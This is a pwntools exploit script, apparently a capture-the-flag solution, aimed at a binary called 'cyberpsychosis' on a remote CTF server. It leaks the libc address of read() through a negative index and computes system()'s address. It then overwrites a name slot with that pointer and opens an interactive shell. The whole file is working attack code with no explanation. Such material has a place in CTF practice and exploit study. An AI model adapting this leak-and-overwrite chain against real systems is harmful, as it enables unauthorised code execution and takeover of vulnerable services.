from pwn import *

LOCAL = False
REMOTE = True
GDB = False
USE_ONE_GADGET = False
context.arch = 'amd64'
context.os = 'linux'
context.endian = 'little'
context.terminal = ['tmux', 'splitw', '-h']

LOCAL_BIN = "./cyberpsychosis"
LIBC = "./libc-2.31.so" #ELF("./libc-2.31.so") # Set library path when know it
ENV = {"LD_PRELOAD": LIBC} if LIBC else {}

if LOCAL:
    p = process([LOCAL_BIN], env=ENV)
    ELF_LOADED = ELF(LOCAL_BIN)
    ROP_LOADED = ROP(ELF_LOADED)

elif REMOTE:
    p = remote('ctf.adl.tw', 10004)
    ELF_LOADED = ELF(LOCAL_BIN)
    ROP_LOADED = ROP(ELF_LOADED)

if GDB and not REMOTE:
    gdb.attach(p) # "b *(get_line+(0x15ae-0x150f))"

lib = ELF('./libc-2.31.so')
ROP_LIBC = ROP(lib)

# # print('%x'%ELF_LOADED.plt['write'])
# elf_base = ELF_LOADED.address # ! Memory leaking needed
# lib_base = lib.address # ! Memory leaking needed

execve_offset = lib.symbols['execve']
print('%x'%execve_offset) # 0xe3170
# print('%x'%lib.symbols['atol']) # 0x445d0
# print('%x'%lib.symbols['setvbuf']) # 0x84ce0
system_offset = lib.symbols['system']
print('%x'%system_offset) # 0x52290
read_offset = lib.symbols['read']
print('%x'%read_offset) # 0x10dfc0
# # print('%x'%ELF_LOADED.symbols['system']) # 


p.sendafter(b'> ', b'2\n-2\n \n \n')
print('start leaking\n')
for i in range(10):
    print(p.recvline())

p.sendafter(b'> ', b'1\n-2\n')

for i in range(4):
    print(p.recvline())
print('stop leaking\n')

p.sendafter(b'> ', b'1\n-2\n')
for i in range(16):
    if i == 11:
        str = p.recvline()
        print('the following line is the address of read()')
        read_addr = u64(str[11:17] + b'\x00\x00')

        print(str[11:17] + b'\x00\x00')
        print('%X'%read_addr)
    else:
        print(p.recvline())
print('stop leaking\n')

system_addr = read_addr - read_offset + system_offset

n = 8
payload = b''
payload += b'a' * (n) # implant name
# payload += p64(setvbuf_addr)
payload += p64(system_addr) + b'\n' # implant name
# payload += b'/bin/sh'  # implant value # !手動輸入 /bin/sh 

p.sendafter(b'> ', b'2\n-2\n'+ payload)
p.interactive()
